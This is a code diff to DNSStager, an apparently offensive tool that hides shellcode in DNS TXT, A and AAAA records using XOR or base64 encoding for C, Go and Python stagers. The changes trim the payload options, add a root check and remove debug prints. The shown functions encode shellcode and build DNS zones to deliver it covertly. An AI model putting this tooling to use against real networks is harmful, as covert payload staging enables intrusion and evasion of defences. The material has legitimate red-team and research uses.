@@ -12,18 +12,11 @@ from .dnsserver import *
 dnsstager_payloads = {
 
     "x64/c/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code",
-    "x64/c/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via compiled x64 C code",
     "x86/c/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code",
-    "x86/c/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via compiled x86 C code",
     "x64/golang/txt": "Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code",
     "x64/golang/ipv6": "Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code",
-    "x64/golang/ipv4":  "Resolve your payload as IPV4 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code",
     "x86/golang/txt": "Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code",
-    "x86/golang/ipv6": "Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code",
-    "x86/golang/ipv4":  "Resolve your payload as IPV4 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code",
-    "python/xor/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via python script",
-    "python/xor/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via python script",
-    "python/b64/txt":  "Resolve your payload as TXT records encoded using base64 via python script",
+    "x86/golang/ipv6": "Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code"
 
     }
 
@@ -32,7 +25,7 @@ def print_error(message):
     cprint("[-] %s" % message, "red")
 
 def print_success(message):
-    cprint("[-] %s" % message, "green")
+    cprint("[+] %s" % message, "green")
 
 def print_info(message):
     cprint("[!] %s" % message, "yellow")
@@ -88,6 +81,12 @@ def convert_string_key_to_int(key):
     return int(key.replace("0x", ""))
 
 
+def check_root():
+    uid = os.getuid()
+    if uid != 0:
+        print_error("\033[1mPlease run DNSStager as root\033[0m")
+        exit()
+
 # you can't use base64 with ipv6 payloads
 def encode_xor_shellcode(shellcode, key):
     new_shellcode = []
@@ -115,7 +114,6 @@ def generate_zone_TXT(domain, shellcode, prefix):
     # can be option later on ;)
     splitter = 200
     txt_records =  [shellcode[i:i+splitter] for i in range(0, len(shellcode), splitter)]
-    print(txt_records)
 
     # Empty ZONES
     ZONES = {}
@@ -123,7 +121,6 @@ def generate_zone_TXT(domain, shellcode, prefix):
     for i in range(len(txt_records)):
         domain_name = prefix + str(i) + "." + domain
         ZONES[domain_name] = [Record(TXT, txt_records[i])]
-    print(ZONES)
     return(ZONES)
 
 
@@ -134,7 +131,6 @@ def generate_zone_ipv4(domain, shellcode, prefix):
     # each list represent on A record
     opcodes =  [str(ord(i)) for i in shellcode]
     ipv4_list_records =  [opcodes[i:i+splitter] for i in range(0, len(opcodes), splitter)]
-    print(ipv4_list_records)
     # Empty ZONES for later use
     ZONES = {}
 
@@ -142,7 +138,6 @@ def generate_zone_ipv4(domain, shellcode, prefix):
     for list in ipv4_list_records:
         # generate random domains
         domain_name = prefix + str(counter) + "." + domain
-        print(domain_name)
         if len(list) != 4:
             elements_to_extend = 4 - len(list)
             list.extend([str(i) for i in range(elements_to_extend)])
